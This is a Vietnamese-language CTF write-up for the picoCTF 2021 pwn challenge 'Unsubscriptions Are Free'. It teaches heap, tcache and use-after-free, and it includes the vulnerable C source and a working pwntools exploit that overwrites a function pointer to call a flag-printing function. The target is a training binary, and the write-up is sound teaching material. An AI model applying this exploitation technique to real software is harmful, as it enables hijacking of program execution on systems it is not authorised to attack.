# Unsubscriptions Are Free — Writeup cho người mới (Pwn, difficulty 3)

> Dạng bài: **Use-After-Free (UAF)** — dùng lại vùng nhớ đã `free`.
> Đây là bài nhập môn rất hay để hiểu **heap** và **tcache**. Mình giải thích từ đầu.

---

## 0. Khái niệm cần biết trước

### 0.1 Heap và `malloc`/`free`
Ngoài stack (biến cục bộ), chương trình còn có **heap** — vùng nhớ để cấp phát động bằng `malloc(size)`. Khi không dùng nữa thì `free(ptr)` trả vùng đó lại cho hệ thống.
- `malloc(n)` trả về con trỏ tới vùng nhớ ít nhất `n` byte.
- `free(p)` đánh dấu vùng của `p` là "rảnh", có thể cấp lại sau.

### 0.2 Use-After-Free là gì?
Nếu sau khi `free(p)` ta **vẫn còn dùng `p`** (đọc/ghi/gọi hàm qua nó), đó là **UAF**. Vùng nhớ đó có thể đã được `malloc` cấp cho chỗ khác và bị ghi đè — ta lợi dụng để điều khiển dữ liệu mà chương trình tưởng là "của nó".

### 0.3 tcache — "kho" chunk nhỏ của glibc
glibc (thư viện C) có cơ chế **tcache**: các chunk nhỏ (≤ 0x410) khi `free` được cất vào danh sách theo **kích thước**, và `malloc` cùng kích thước sẽ **lấy lại chunk vừa free gần nhất** (kiểu LIFO - vào sau ra trước). Đây là chìa khoá của bài này: **free chunk 0x10 rồi malloc 8 sẽ lấy lại đúng chunk đó**.

### 0.4 Con trỏ hàm trong struct
```c
typedef struct {
    uintptr_t (*whatToDo)();   // con trỏ hàm
    char *username;
} cmd;
```
`whatToDo` là **địa chỉ của một hàm**. Chương trình gọi `(*user->whatToDo)()` = "gọi hàm tại địa chỉ lưu trong `whatToDo`". Nếu ta ghi đè `whatToDo` thành địa chỉ hàm `hahaexploitgobrrr` (hàm in flag), chương trình sẽ gọi nó. 👈 mục tiêu của bài.

---

## 1. Đề bài / file đính kèm
- CyLab id **187**, picoCTF 2021, tên "Unsubscriptions Are Free".
- Handout: `vuln` (ELF 32-bit, not stripped) + `vuln.c`.
- Remote: `nc xebec.cylabacademy.net <port>` (port đổi mỗi lần start).

---

## 2. Recon
```bash
python3 -c "from pwn import *; print(ELF('vuln').checksec())"
# Arch: i386-32-little ; NX enabled ; PIE: No PIE (0x8048000) ; Canary found
nm vuln | grep -iE 'haha|main|user'
# 08049266 T hahaexploitgobrrr     <-- hàm in flag
```
- **32-bit** ⇒ địa chỉ 4 byte, dùng `p32`.
- **No PIE** ⇒ địa chỉ hàm cố định; `hahaexploitgobrrr = 0x08049266`.
- Canary có nhưng **không liên quan** vì ta không tràn stack.

Đọc `vuln.c`, để ý hàm `main` + menu:
```c
user = (cmd *)malloc(sizeof(user));   // sizeof(con trỏ) = 4 byte -> chunk 0x10
while(1){ printMenu(); processInput(); doProcess(user); }

void doProcess(cmd* obj){ (*obj->whatToDo)(); }   // gọi hàm theo whatToDo

void i(){                 // 'I' - inquire
  puts("You're leaving already(Y/N)?");
  scanf(" %c", &response);
  if(toupper(response)=='Y'){ free(user); }        // <-- FREE user, nhưng KHÔNG xoá con trỏ
  ...
}
void leaveMessage(){      // 'L'
  char* msg = (char*)malloc(8);                    // <-- malloc 8 -> lấy lại chunk vừa free
  read(0, msg, 8);                                 // <-- GHI 8 byte vào đó
}
void s(){ printf("OOP! Memory leak...%p\n", hahaexploitgobrrr); ... }  // in địa chỉ haha (không cần)
```

---

## 3. Lỗ hổng phát hiện
- **Use-After-Free**: `i()` gọi `free(user)` nhưng biến `user` vẫn trỏ tới vùng đã free.
- Vòng lặp chính luôn gọi `doProcess(user)` ⇒ đọc `user->whatToDo` từ vùng đã free.
- `leaveMessage()` `malloc(8)` sẽ **lấy lại đúng chunk 0x10 vừa free** và cho ta ghi 8 byte ⇒ ta ghi đè `whatToDo` (4 byte đầu) thành địa chỉ `hahaexploitgobrrr`.

Vì sao kích thước khớp? Trên 32-bit glibc, `malloc(4)` và `malloc(8)` đều trả chunk **0x10** ⇒ cùng "ngăn" tcache ⇒ `malloc(8)` lấy lại chunk của `user`.

---

## 4. Kỹ thuật khai thác (từng bước)
1. `I` → `Y` : `free(user)` (chunk 0x10 vào tcache).
2. `L` : `malloc(8)` lấy lại chunk đó; `read(0,msg,8)` ghi vào `whatToDo`.
   - 4 byte đầu = `p32(0x08049266)` (địa chỉ `hahaexploitgobrrr`).
3. Vòng lặp gọi `doProcess(user)` → gọi `hahaexploitgobrrr` → in flag. 🎯

Payload 8 byte: `p32(0x08049266) + b"AAAA"`.

### ⚠️ Cái bẫy lớn: stdio buffering
Lần đầu mình gửi cả chuỗi `I\nY\nL<8byte>` một lượt → **thất bại**. Vì sao?
`scanf` dùng **bộ đệm stdio**: nó `read()` cả cục dữ liệu đang có vào bộ đệm riêng. Khi tới `read(0, msg, 8)` (đọc thẳng từ file descriptor 0), fd đã bị `scanf` "rút cạn" ⇒ `read` trả 0 byte ⇒ `whatToDo` không đổi ⇒ chương trình nhảy vào rác và **segfault**.

**Cách sửa:** đồng bộ theo output —
- gửi `I\n`, đợi `(Y/N)?`, gửi `Y\n`,
- gửi `L` **một mình**, đợi tới khi in ra `try anyways:`,
- rồi mới gửi 8 byte payload.

Lúc đó `scanf` đã xử lý xong `L`, `read(0,...)` mới nhận đúng 8 byte.

---

## 5. Exploit script (có chú thích)
Xem file [exploit.py](exploit.py).

```python
from pwn import *
context.arch = 'i386'

HAHA = 0x08049266           # hahaexploitgobrrr (nm, non-PIE)

p = remote(HOST, PORT)

p.recvuntil(b'(e)xit')      # đợi menu
p.send(b'I\n')              # inquire...
p.recvuntil(b'(Y/N)?')
p.send(b'Y\n')              # ...Y -> free(user)

p.recvuntil(b'(e)xit')      # menu lại
p.send(b'L')                # leaveMessage; gửi 'L' một mình
p.recvuntil(b'try anyways:')# đợi prompt của nó
p.send(p32(HAHA) + b'AAAA') # ghi 8 byte: whatToDo = haha

print(p.recvall(timeout=5).decode(errors='replace'))
```

---

## 6. Flag
`academy{redacted}`

---

## 7. Bài học / pattern tái sử dụng
1. **UAF = free rồi vẫn dùng con trỏ.** Chỉ cần một chỗ `free` mà không null con trỏ là đủ.
2. **tcache LIFO**: `free` chunk 0x10 rồi `malloc` cùng cỡ ⇒ lấy lại đúng chunk đó. Đây là cách ghi đè "vật thể" cũ bằng dữ liệu mới.
3. **Struct có con trỏ hàm ở offset 0** ⇒ ghi đè 4 byte đầu là chiếm luôn luồng thực thi.
4. **No PIE ⇒ địa chỉ hàm cố định**, không cần leak (bài này còn cho leak sẵn ở `s()`).
5. **CẢNH BÁO stdio buffering**: khi chương trình trộn `scanf` (buffered) với `read(0,...)` (raw), đừng gửi mọi thứ một lượt — **đồng bộ theo output** (đợi prompt) trước khi gửi phần mà `read` sẽ đọc. Đây là lỗi khiến exploit "chạy local được mà remote fail" rất hay gặp.
